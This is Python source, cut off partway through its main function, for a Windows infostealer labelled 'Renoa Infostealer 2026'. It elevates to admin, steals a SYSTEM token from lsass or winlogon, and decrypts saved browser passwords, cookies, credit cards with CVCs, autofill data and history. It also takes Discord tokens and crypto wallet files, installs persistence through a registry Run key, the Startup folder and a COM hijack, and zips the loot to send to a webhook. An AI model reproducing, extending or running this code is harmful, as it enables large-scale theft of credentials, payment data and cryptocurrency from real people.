import sys
import os
import io
import json
import base64
import struct
import shutil
import sqlite3
import tempfile
import ctypes
import time
import re
import subprocess
import random
import zipfile
from datetime import datetime, timedelta

WEBHOOK_URL = "use ur weebhook"
RENOA_NAME  = "RENOA"

try:
    import requests
except ImportError:
    sys.exit(1)

try:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
except ImportError:
    sys.exit(1)

try:
    import win32crypt, win32security, win32api, win32con
    import psutil
except ImportError:
    sys.exit(1)

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def _elevate():
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{a}"' for a in sys.argv[1:])
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return True
    except Exception:
        return False

if not _is_admin():
    if _elevate():
        sys.exit(0)
    sys.exit(1)

def enable_debug_privilege():
    try:
        h = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        luid = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        win32security.AdjustTokenPrivileges(h, False, [(luid, win32con.SE_PRIVILEGE_ENABLED)])
        return True
    except Exception:
        return False

def get_system_token():
    if not enable_debug_privilege():
        return None
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    for target in ("winlogon.exe", "services.exe", "lsass.exe"):
        for p in psutil.process_iter(attrs=["pid", "name"]):
            if (p.info.get("name") or "").lower() != target:
                continue
            for access in (
                win32con.PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                PROCESS_QUERY_LIMITED_INFORMATION,
                win32con.PROCESS_QUERY_INFORMATION,
            ):
                try:
                    ph = win32api.OpenProcess(access, False, p.info["pid"])
                    th = win32security.OpenProcessToken(
                        ph, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY | win32con.TOKEN_IMPERSONATE)
                    return win32security.DuplicateTokenEx(
                        th, win32security.SecurityImpersonation,
                        win32con.MAXIMUM_ALLOWED, win32security.TokenImpersonation)
                except Exception:
                    continue
    return None

def impersonate(token):
    if token is None:
        return False
    try:
        win32security.SetThreadToken(None, token)
        return True
    except Exception:
        return False

def revert():
    try:
        win32security.SetThreadToken(None, None)
    except Exception:
        pass

def dpapi_unprotect(data):
    try:
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
    except Exception:
        return None

AES_KEY_FLAG1    = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
CHACHA_KEY_FLAG2 = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
XOR_KEY_FLAG3    = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

def parse_blob(blob):
    try:
        b = io.BytesIO(blob)
        hl = struct.unpack("<I", b.read(4))[0]
        b.read(hl)
        struct.unpack("<I", b.read(4))
        flag = b.read(1)[0]
        p = {"flag": flag}
        if flag in (1, 2):
            p["iv"]  = b.read(12)
            p["ct"]  = b.read(32)
            p["tag"] = b.read(16)
        elif flag == 3:
            p["enc_aes"] = b.read(32)
            p["iv"]  = b.read(12)
            p["ct"]  = b.read(32)
            p["tag"] = b.read(16)
        else:
            p["raw"] = b.read()
        return p
    except Exception:
        return None

def decrypt_cng(encrypted, key_name):
    try:
        ncrypt = ctypes.windll.NCRYPT
        hProvider = ctypes.c_void_p()
        if ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0) != 0:
            return None
        hKey = ctypes.c_void_p()
        name = key_name if isinstance(key_name, str) else key_name.decode("utf-8", errors="ignore")
        if ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), name, 0, 0) != 0:
            ncrypt.NCryptFreeObject(hProvider)
            return None
        pcb = ctypes.c_ulong(0)
        ib = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
        if ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, None, 0, ctypes.byref(pcb), 0x40) != 0:
            ncrypt.NCryptFreeObject(hKey)
            ncrypt.NCryptFreeObject(hProvider)
            return None
        ob = (ctypes.c_ubyte * pcb.value)()
        status = ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, ob, pcb.value, ctypes.byref(pcb), 0x40)
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return bytes(ob[:pcb.value]) if status == 0 else None
    except Exception:
        return None

def derive_v20(parsed, key_names):
    for key_name in key_names:
        try:
            flag = parsed["flag"]
            if flag == 1:
                c = AES.new(AES_KEY_FLAG1, AES.MODE_GCM, nonce=parsed["iv"])
                return c.decrypt_and_verify(parsed["ct"], parsed["tag"])
            if flag == 2:
                c = ChaCha20_Poly1305.new(key=CHACHA_KEY_FLAG2, nonce=parsed["iv"])
                return c.decrypt_and_verify(parsed["ct"], parsed["tag"])
            if flag == 3:
                aes_key = decrypt_cng(parsed["enc_aes"], key_name)
                if not aes_key or len(aes_key) < 32:
                    continue
                aes_key = aes_key[:32]
                xored = bytes(a ^ b for a, b in zip(aes_key, XOR_KEY_FLAG3))
                c = AES.new(xored, AES.MODE_GCM, nonce=parsed["iv"])
                return c.decrypt_and_verify(parsed["ct"], parsed["tag"])
            return parsed.get("raw", b"")
        except Exception:
            continue
    return None

def get_master_keys(local_state, key_names, sys_token):
    if not os.path.isfile(local_state):
        return None, None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            j = json.load(f)
    except Exception:
        return None, None
    oc = j.get("os_crypt", {})
    v10 = v20 = None

    if "encrypted_key" in oc:
        try:
            raw = base64.b64decode(oc["encrypted_key"])
            if raw[:5] == b"DPAPI":
                raw = raw[5:]
            v10 = dpapi_unprotect(raw)
        except Exception:
            pass

    if "app_bound_encrypted_key" in oc:
        try:
            raw = base64.b64decode(oc["app_bound_encrypted_key"])
            if raw[:4] == b"APPB":
                raw = raw[4:]
            d1 = None
            if impersonate(sys_token):
                try:
                    d1 = dpapi_unprotect(raw)
                finally:
                    revert()
            if d1:
                d2 = dpapi_unprotect(d1)
                if d2:
                    if len(d2) == 32:
                        v20 = d2
                    else:
                        p = parse_blob(d2)
                        if p and p.get("flag") in (1, 2, 3):
                            if impersonate(sys_token):
                                try:
                                    v20 = derive_v20(p, key_names)
                                finally:
                                    revert()
                        if not v20 and len(d2) >= 32:
                            v20 = d2[-32:] or d2[:32]
        except Exception:
            pass
    return v10, v20

def is_clean_value(s: str) -> bool:
    if not s or len(s) > 8192:
        return False
    printable = sum(1 for c in s if 32 <= ord(c) <= 126)
    if len(s) > 0 and (printable / len(s)) < 0.85:
        return False
    if any(ord(c) < 9 for c in s):
        return False
    return True

def decrypt_value(enc, v10, v20, is_password=False):
    if not enc or len(enc) < 3:
        return None
    if isinstance(enc, str):
        enc = enc.encode("utf-8", errors="ignore")

    def _aes(key, soft=False):
        if not key or len(key) < 16:
            return None
        try:
            c = AES.new(key, AES.MODE_GCM, nonce=enc[3:15])
            return c.decrypt_and_verify(enc[15:-16], enc[-16:])
        except Exception:
            if soft:
                try:
                    c = AES.new(key, AES.MODE_GCM, nonce=enc[3:15])
                    return c.decrypt(enc[15:-16])
                except Exception:
                    return None
            return None

    def _to_str(plain):
        if plain is None:
            return None
        try:
            if len(plain) > 32:
                s = plain[32:].decode("utf-8", errors="ignore").rstrip("\x00").strip()
                if s and is_clean_value(s):
                    return s
            s = plain.decode("utf-8", errors="ignore").rstrip("\x00").strip()
            if s and is_clean_value(s):
                return s
        except Exception:
            pass
        return None

    ver = enc[:3]
    if ver not in (b"v10", b"v11", b"v20"):
        try:
            d = dpapi_unprotect(enc)
            if d:
                s = d.decode("utf-8", errors="ignore")
                if is_clean_value(s):
                    return s
        except Exception:
            pass
        return None

    keys = []
    if v20: keys.append(v20)
    if v10: keys.append(v10)

    for k in keys:
        for soft in (False, True):
            plain = _aes(k, soft=soft)
            s = _to_str(plain)
            if s is not None:
                return s
    return None

def copy_db_safe(path, retries=12):
    if not os.path.isfile(path):
        return None
    fd, tmp = tempfile.mkstemp(prefix="rn_", suffix=".tmp")
    os.close(fd)

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    GENERIC_READ = 0x80000000
    FILE_SHARE_ALL = 0x7
    OPEN_EXISTING = 3
    kernel32.CreateFileW.restype = ctypes.c_void_p
    kernel32.CreateFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
                                     ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p]
    kernel32.ReadFile.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong,
                                  ctypes.POINTER(ctypes.c_ulong), ctypes.c_void_p]
    kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

    for attempt in range(retries):
        h = kernel32.CreateFileW(path, GENERIC_READ, FILE_SHARE_ALL, None, OPEN_EXISTING, 0, None)
        if h and h != ctypes.c_void_p(-1).value:
            try:
                buf = bytearray()
                chunk = ctypes.create_string_buffer(65536)
                br = ctypes.c_ulong(0)
                while True:
                    ok = kernel32.ReadFile(h, chunk, 65536, ctypes.byref(br), None)
                    if not ok or br.value == 0:
                        break
                    buf.extend(chunk.raw[:br.value])
                with open(tmp, "wb") as f:
                    f.write(buf)
                return tmp
            finally:
                kernel32.CloseHandle(h)
        try:
            shutil.copy2(path, tmp)
            return tmp
        except Exception:
            time.sleep(0.25 * (attempt + 1))
    try:
        os.remove(tmp)
    except Exception:
        pass
    return None

def filetime(ts):
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)

def close_browsers():
    names = [
        "chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
        "opera_gx.exe", "vivaldi.exe", "chromium.exe", "msedgewebview2.exe",
        "firefox.exe"
    ]
    for _ in range(3):
        for n in names:
            subprocess.run(["taskkill", "/F", "/IM", n],
                           capture_output=True, creationflags=0x08000000)
        time.sleep(0.9)

def extract_passwords(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB), date_created FROM logins")
        for url, user, enc, dc in cur.fetchall():
            if not enc or len(enc) < 3:
                continue
            pw = decrypt_value(enc, v10, v20, is_password=True)
            if pw:
                rows.append({
                    "url": url or "",
                    "username": user or "",
                    "password": pw,
                    "created": filetime(dc)
                })
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows

def extract_cookies(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        try:
            cur.execute("""SELECT host_key, name, path, CAST(encrypted_value AS BLOB),
                                  expires_utc, is_secure, is_httponly, samesite
                           FROM cookies""")
            ext = True
        except Exception:
            cur.execute("""SELECT host_key, name, path, CAST(encrypted_value AS BLOB),
                                  expires_utc, is_secure, is_httponly
                           FROM cookies""")
            ext = False

        for row in cur.fetchall():
            if ext:
                host, name, path, enc, exp, sec, http, ss = row
            else:
                host, name, path, enc, exp, sec, http = row
                ss = 0
            if not enc or len(enc) < 3:
                continue
            val = decrypt_value(enc, v10, v20, is_password=False)
            if val is not None and is_clean_value(val):
                rows.append({
                    "host": host or "",
                    "name": name or "",
                    "path": path or "/",
                    "value": val,
                    "expires": exp,
                    "secure": bool(sec),
                    "httpOnly": bool(http),
                    "sameSite": ss
                })
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows

def extract_cards(db_path, v10, v20):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cvc_map = {}
        try:
            cur.execute("SELECT guid, CAST(value_encrypted AS BLOB) FROM local_stored_cvc")
            for guid, enc in cur.fetchall():
                if guid and enc and len(enc) >= 3:
                    cvc = decrypt_value(enc, v10, v20, is_password=True)
                    if cvc:
                        cvc_map[guid] = cvc
        except Exception:
            pass
        try:
            cur.execute("SELECT instrument_id, CAST(value_encrypted AS BLOB) FROM server_stored_cvc")
            for iid, enc in cur.fetchall():
                if enc and len(enc) >= 3:
                    cvc = decrypt_value(enc, v10, v20, is_password=True)
                    if cvc:
                        cvc_map[f"server_{iid}"] = cvc
        except Exception:
            pass
        cur.execute("""SELECT guid, name_on_card, expiration_month, expiration_year,
                              CAST(card_number_encrypted AS BLOB) FROM credit_cards""")
        for guid, name, em, ey, enc in cur.fetchall():
            num = ""
            if enc and len(enc) >= 3:
                num = decrypt_value(enc, v10, v20, is_password=True) or ""
            cvc = cvc_map.get(guid or "", "")
            if num or name or cvc:
                rows.append({
                    "name": name or "",
                    "number": num,
                    "exp_month": em,
                    "exp_year": ey,
                    "cvc": cvc
                })
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows

def extract_autofill(db_path):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT name, value FROM autofill")
        for n, v in cur.fetchall():
            if n and v:
                rows.append({"name": n, "value": v})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows

def extract_history(db_path):
    tmp = copy_db_safe(db_path)
    if not tmp:
        return []
    rows = []
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        for u, t, vc, lvt in cur.fetchall():
            rows.append({"url": u, "title": t, "visits": vc, "last": filetime(lvt)})
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return rows

def firefox_get_key(profile):
    key4 = os.path.join(profile, "key4.db")
    if not os.path.isfile(key4):
        return None
    tmp = copy_db_safe(key4)
    if not tmp:
        return None
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT a11 FROM nssPrivate")
        row = cur.fetchone()
        conn.close()
        if row and row[0] and len(row[0]) >= 24:
            return row[0][-24:]
    except Exception:
        pass
    finally:
        try: os.remove(tmp)
        except Exception: pass
    return None

def firefox_decrypt(enc_b64, key):
    if not key or not enc_b64:
        return ""
    try:
        from Crypto.Cipher import DES3
        data = base64.b64decode(enc_b64)
        if len(data) < 16:
            return ""
        iv = data[3:19] if len(data) > 32 else data[:8]
        ct = data[19:] if len(data) > 32 else data[8:]
        cipher = DES3.new(key[:24], DES3.MODE_CBC, iv[:8])
        plain = cipher.decrypt(ct)
        pad = plain[-1]
        if 1 <= pad <= 8:
            plain = plain[:-pad]
        return plain.decode("utf-8", errors="ignore")
    except Exception:
        return ""

def process_firefox():
    roaming = os.environ.get("APPDATA", "")
    ff_root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(ff_root):
        return {}, {}
    pws_map, ck_map = {}, {}
    for prof in os.listdir(ff_root):
        pd = os.path.join(ff_root, prof)
        if not os.path.isdir(pd):
            continue
        key = firefox_get_key(pd)
        tag = f"Firefox/{prof}"
        pws_map[tag] = []
        ck_map[tag] = []

        logins_path = os.path.join(pd, "logins.json")
        if os.path.isfile(logins_path):
            try:
                with open(logins_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for e in data.get("logins", []):
                    pws_map[tag].append({
                        "url": e.get("hostname") or e.get("formSubmitURL") or "",
                        "username": firefox_decrypt(e.get("encryptedUsername", ""), key),
                        "password": firefox_decrypt(e.get("encryptedPassword", ""), key),
                    })
            except Exception:
                pass

        ck = os.path.join(pd, "cookies.sqlite")
        if os.path.isfile(ck):
            tmp = copy_db_safe(ck)
            if tmp:
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT host, name, path, value, expiry, isSecure FROM moz_cookies")
                    for host, name, path, value, exp, sec in cur.fetchall():
                        ck_map[tag].append({
                            "host": host, "name": name, "path": path,
                            "value": value, "expires": exp, "secure": bool(sec)
                        })
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(tmp)
                    except Exception: pass
    return pws_map, ck_map

TOKEN_RE = re.compile(r"[\w-]{24,}\.[\w-]{6,}\.[\w-]{25,}|mfa\.[\w-]{80,}")

def grab_tokens():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    paths = [
        os.path.join(roaming, "discord"),
        os.path.join(roaming, "discordcanary"),
        os.path.join(roaming, "discordptb"),
        os.path.join(roaming, "Opera Software", "Opera Stable"),
        os.path.join(roaming, "Opera Software", "Opera GX Stable"),
    ]
    for base in (
        os.path.join(local, "Google", "Chrome", "User Data"),
        os.path.join(local, "Microsoft", "Edge", "User Data"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
    ):
        if os.path.isdir(base):
            try:
                for e in os.listdir(base):
                    ls = os.path.join(base, e, "Local Storage", "leveldb")
                    if os.path.isdir(ls):
                        paths.append(ls)
            except Exception:
                pass
    found = set()
    for p in paths:
        if not os.path.isdir(p):
            continue
        for root, _, files in os.walk(p):
            for fn in files:
                if not fn.endswith((".ldb", ".log")):
                    continue
                try:
                    with open(os.path.join(root, fn), "r", encoding="utf-8", errors="ignore") as f:
                        found.update(TOKEN_RE.findall(f.read()))
                except Exception:
                    pass
    return sorted(found)


def grab_wallets():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    wallets = {}

    # MetaMask (Chrome / Edge / Brave)
    metamask_ids = ["nkbihfbeogaeaoehlefnkodbefgpgknn"]
    for browser, base in [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
    ]:
        if not os.path.isdir(base):
            continue
        for profile in ["Default"] + [p for p in os.listdir(base) if p.startswith("Profile ")]:
            for mid in metamask_ids:
                ext = os.path.join(base, profile, "Local Extension Settings", mid)
                if os.path.isdir(ext):
                    wallets[f"MetaMask_{browser}_{profile}"] = ext

   
    exo = os.path.join(roaming, "Exodus", "exodus.wallet")
    if os.path.isdir(exo):
        wallets["Exodus"] = exo

   
    elec = os.path.join(roaming, "Electrum", "wallets")
    if os.path.isdir(elec):
        wallets["Electrum"] = elec

    
    atomic = os.path.join(roaming, "atomic", "Local Storage", "leveldb")
    if os.path.isdir(atomic):
        wallets["Atomic"] = atomic

    
    coinomi = os.path.join(local, "Coinomi", "Coinomi", "wallets")
    if os.path.isdir(coinomi):
        wallets["Coinomi"] = coinomi

   
    guarda = os.path.join(roaming, "Guarda", "Local Storage", "leveldb")
    if os.path.isdir(guarda):
        wallets["Guarda"] = guarda

   
    jaxx = os.path.join(roaming, "com.liberty.jaxx", "IndexedDB")
    if os.path.isdir(jaxx):
        wallets["Jaxx"] = jaxx

    phantom_id = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    for browser, base in [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
    ]:
        if not os.path.isdir(base):
            continue
        for profile in ["Default"] + [p for p in os.listdir(base) if p.startswith("Profile ")]:
            ext = os.path.join(base, profile, "Local Extension Settings", phantom_id)
            if os.path.isdir(ext):
                wallets[f"Phantom_{browser}_{profile}"] = ext

    return wallets

def collect_wallet_files(wallets_dict):
    """Return dict of relative_path -> bytes for ZIP"""
    out = {}
    for name, path in wallets_dict.items():
        if os.path.isfile(path):
            try:
                with open(path, "rb") as f:
                    out[f"Wallets/{name}/{os.path.basename(path)}"] = f.read()
            except Exception:
                pass
        elif os.path.isdir(path):
            for root, _, files in os.walk(path):
                for fn in files:
                    fp = os.path.join(root, fn)
                    try:
                        rel = os.path.relpath(fp, path)
                        with open(fp, "rb") as f:
                            out[f"Wallets/{name}/{rel}"] = f.read()
                    except Exception:
                        pass
    return out

KEY_CANDIDATES = {
    "Chrome": ["Google Chromekey1", "Google Chrome", "Chromekey1", "Chrome"],
    "Chrome_Beta": ["Google Chromekey1", "Google Chrome", "Chromekey1"],
    "Edge": [
        "Microsoft Edgekey1", "Microsoft Edge", "Edgekey1",
        "MicrosoftEdgekey1", "MSEdge", "Edge",
        "Microsoft Edge Key", "MicrosoftEdge",
        "Microsoft Edge App-Bound Encryption Key",
        "Edge App-Bound Encryption Key", "msedge", "MicrosoftEdgeKey"
    ],
    "Brave": ["Brave Softwarekey1", "Brave Software", "Bravekey1", "Brave"],
    "Vivaldi": ["Vivaldi Technologieskey1", "Vivaldi Technologies", "Vivaldi"],
    "Chromium": ["Google Chromekey1", "Chromium", "Chromekey1"],
    "Opera": ["Opera Softwarekey1", "Opera Software", "Opera"],
    "OperaGX": ["Opera Softwarekey1", "Opera Software", "Opera GX"],
}

def process_chromium(name, base, sys_token):
    if not os.path.isdir(base):
        return {}, {}, {}, {}, {}
    key_names = KEY_CANDIDATES.get(name, ["Google Chromekey1"])
    v10, v20 = get_master_keys(os.path.join(base, "Local State"), key_names, sys_token)
    if not v10 and not v20:
        return {}, {}, {}, {}, {}

    profiles = ["Default"]
    try:
        for e in os.listdir(base):
            if e.startswith("Profile ") or e.startswith("Person "):
                profiles.append(e)
    except Exception:
        pass

    pws_map, ck_map, cards_map, af_map, hist_map = {}, {}, {}, {}, {}

    for profile in profiles:
        pd = os.path.join(base, profile)
        if not os.path.isdir(pd):
            continue
        tag = f"{name}/{profile}"

        pws = []
        for lp in (os.path.join(pd, "Login Data"), os.path.join(pd, "Login Data For Account")):
            if os.path.isfile(lp):
                pws.extend(extract_passwords(lp, v10, v20))
        pws_map[tag] = pws

        cookies = []
        for ck_path in (os.path.join(pd, "Network", "Cookies"), os.path.join(pd, "Cookies")):
            if os.path.isfile(ck_path):
                cookies = extract_cookies(ck_path, v10, v20)
                if cookies:
                    break
        ck_map[tag] = cookies

        cards_map[tag] = extract_cards(os.path.join(pd, "Web Data"), v10, v20)
        af_map[tag] = extract_autofill(os.path.join(pd, "Web Data"))
        hist_map[tag] = extract_history(os.path.join(pd, "History"))

    return pws_map, ck_map, cards_map, af_map, hist_map

def build_passwords_txt(pws):
    lines = []
    for p in pws:
        lines.append(f"URL     : {p['url']}")
        lines.append(f"Username: {p['username']}")
        lines.append(f"Password: {p['password']}")
        lines.append(f"Created : {p.get('created','')}")
        lines.append("-" * 50)
    return "\n".join(lines)

def build_cookies_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File", "# RENOA", ""]
    for c in cookies:
        host = c.get("host", "")
        sub  = "TRUE" if host.startswith(".") else "FALSE"
        exp  = 0
        if c.get("expires") and c["expires"] > 0:
            try:
                exp = int((datetime(1601, 1, 1) + timedelta(microseconds=c["expires"])).timestamp())
            except Exception:
                pass
        secure = "TRUE" if c.get("secure") else "FALSE"
        lines.append(f"{host}\t{sub}\t{c.get('path','/')}\t{secure}\t{exp}\t{c.get('name','')}\t{c.get('value','')}")
    return "\n".join(lines)

def build_cards_txt(cards):
    lines = []
    for c in cards:
        lines.append(f"Cardholder: {c.get('name','')}")
        lines.append(f"Number    : {c.get('number','')}")
        lines.append(f"Exp       : {c.get('exp_month','')}/{c.get('exp_year','')}")
        lines.append(f"CVC       : {c.get('cvc','')}")
        lines.append("-" * 40)
    return "\n".join(lines)

def take_screenshot_bytes():
    if not HAS_PIL:
        return None
    try:
        buf = io.BytesIO()
        ImageGrab.grab(all_screens=True).save(buf, "PNG")
        return buf.getvalue()
    except Exception:
        return None

def build_zip_bytes(payloads: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for arcname, data in payloads.items():
            if data is None:
                continue
            if isinstance(data, str):
                data = data.encode("utf-8", errors="replace")
            zf.writestr(arcname, data)
    return buf.getvalue()

def send_zip(zip_data: bytes):
    try:
        files = {"file": (f"{RENOA_NAME}.zip", zip_data, "application/zip")}
        r = requests.post(WEBHOOK_URL, files=files, timeout=300)
        return r.status_code
    except Exception:
        return -1

def install_persistence():
    """Multi-method HKCU persistence"""
    try:
        import winreg
        script = os.path.abspath(sys.argv[0])
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.isfile(pythonw):
            pythonw = sys.executable
        cmd = f'"{pythonw}" "{script}"'

        # 1. Run key
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, RENOA_NAME, 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except Exception:
            pass

        
        try:
            startup = os.path.join(os.environ.get("APPDATA", ""),
                                   r"Microsoft\Windows\Start Menu\Programs\Startup")
            os.makedirs(startup, exist_ok=True)
            dst = os.path.join(startup, f"{RENOA_NAME}.pyw")
            if not os.path.isfile(dst):
                shutil.copy2(script, dst)
        except Exception:
            pass

        
        try:
            clsid = "{0010890e-8789-413c-adbc-48f5b511b3af}"
            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, script)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)
        except Exception:
            pass
    except Exception:
        pass

def main():
    time.sleep(0.5 + random.random())
    close_browsers()
    sys_token = get_system_token()
    install_persistence()

    local   = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")

    targets = [
        ("Chrome",      os.path.join(local, "Google", "Chrome", "User Data")),
        ("Chrome_Beta", os.path.join(local, "Google", "Chrome Beta", "User Data")),
        ("Edge",        os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave",       os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Vivaldi",     os.path.join(local, "Vivaldi", "User Data")),
        ("Chromium",    os.path.join(local, "Chromium", "User Data")),
        ("Opera",       os.path.join(roaming, "Opera Software", "Opera Stable")),
        ("OperaGX",     os.path.join(roaming, "Opera Software", "Opera GX Stable")),
    ]

    all_pws_map, all_ck_map, all_cards_map, all_af_map, all_hist_map = {}, {}, {}, {}, {}
    total_pws = total_ck = total_cards = total_af = total_hist = 0

    for name, base in targets:
        try:
            pws, ck, cards, af, hist = process_chromium(name, base, sys_token)
            all_pws_map.update(pws)
            all_ck_map.update(ck)
            all_cards_map.update(cards)
            all_af_map.update(af)
            all_hist_map.update(hist)
            total_pws   += sum(len(v) for v in pws.values())
            total_ck    += sum(len(v) for v in ck.values())
            total_cards += sum(len(v) for v in cards.values())
            total_af    += sum(len(v) for v in af.values())
            total_hist  += sum(len(v) for v in hist.values())
        except Exception:
            pass

    try:
        ff_pws, ff_ck = process_firefox()
        all_pws_map.update(ff_pws)
        all_ck_map.update(ff_ck)
        total_pws += sum(len(v) for v in ff_pws.values())
        total_ck  += sum(len(v) for v in ff_ck.values())
    except Exception:
        pass

    tokens = []
    try:
        tokens = grab_tokens()
    except Exception:
        pass

    wallet_files = {}
    try:
        wallets = grab_wallets()
        wallet_files = collect_wallet_files(wallets)
    except Exception:
        pass

    host = os.environ.get("COMPUTERNAME", "pc")
    user = os.environ.get("USERNAME", "?")

    sys_info = (
        f"{RENOA_NAME}\n"
        f"Host     : {host}\n"
        f"User     : {user}\n"
        f"Time     : {datetime.now()}\n"
        f"Admin    : True\n"
        f"SYSTEM   : {bool(sys_token)}\n"
        f"Passwords: {total_pws}\n"
        f"Cookies  : {total_ck}\n"
        f"Cards    : {total_cards}\n"
        f"Tokens   : {len(tokens)}\n"
        f"History  : {total_hist}\n"
        f"Autofill : {total_af}\n"
        f"Wallets  : {len(wallet_files)}\n"
    )

    note = (
        "Renoa Infostealer 2026\n"
        "========================\n"
        "Full browser credential + cookie + card + token + wallet extractor.\n"
        "Renoa Infostealer 2026\n"
        "Renoa Infostealer 2026\n"
        "Renoa Infostealer 2026\n"
        "Renoa Infostealer 2026\n"
    )

    payloads = {}

    for tag, pws in all_pws_map.items():
        if pws:
            safe = tag.replace("/", "_").replace(" ", "_")
            payloads[f"Passwords/{safe}/passwords.txt"]  = build_passwords_txt(pws)
            payloads[f"Passwords/{safe}/passwords.json"] = json.dumps(pws, indent=2, ensure_ascii=False)

    for tag, cookies in all_ck_map.items():
        if cookies:
            safe = tag.replace("/", "_").replace(" ", "_")
            payloads[f"Cookies/{safe}/cookies_netscape.txt"] = build_cookies_netscape(cookies)
            payloads[f"Cookies/{safe}/cookies.json"]         = json.dumps(cookies, indent=2, ensure_ascii=False)

    for tag, cards in all_cards_map.items():
        if cards:
            safe = tag.replace("/", "_").replace(" ", "_")
            payloads[f"CreditCards/{safe}/creditcards.txt"]  = build_cards_txt(cards)
            payloads[f"CreditCards/{safe}/creditcards.json"] = json.dumps(cards, indent=2, ensure_ascii=False)

    for tag, af in all_af_map.items():
        if af:
            safe = tag.replace("/", "_").replace(" ", "_")
            payloads[f"Autofill/{safe}/autofill.txt"] = "\n".join(
                f"{a['name']} = {a['value']}" for a in af
            )

    for tag, hist in all_hist_map.items():
        if hist:
